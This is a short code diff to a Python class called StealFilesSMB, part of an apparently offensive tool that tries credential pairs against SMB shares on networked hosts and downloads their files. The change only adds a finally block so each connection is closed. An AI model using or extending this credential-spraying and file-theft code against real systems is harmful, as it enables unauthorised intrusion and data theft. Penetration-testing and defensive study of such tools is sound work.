@@ -179,6 +179,9 @@ class StealFilesSMB:
                     for username, password in creds:
                         if self.stop_execution:
                             break
+                        # SMB-1: track the connection so it's closed in a
+                        # finally block, even on exception paths.
+                        conn = None
                         try:
                             logger.info(f"Trying credential {username}:{password} for share {share} on {ip}")
                             conn = self.connect_smb(ip, username, password)
@@ -194,12 +197,17 @@ class StealFilesSMB:
                                     success = True
                                     countfiles = len(remote_files)
                                     logger.info(f"Successfully stolen {countfiles} files from {ip}:{port} on share '{share}' with user '{username}'")
-                                conn.close()
                                 if success:
                                     timer.cancel()  # Cancel the timer if the operation is successful
                                     break  # Exit the loop as we have found valid credentials
                         except Exception as e:
                             logger.error(f"Error stealing files from {ip} on share '{share}' with user '{username}': {e}")
+                        finally:
+                            if conn is not None:
+                                try:
+                                    conn.close()
+                                except Exception:
+                                    pass
 
                 # Ensure the action is marked as failed if no files were found
                 if not success:
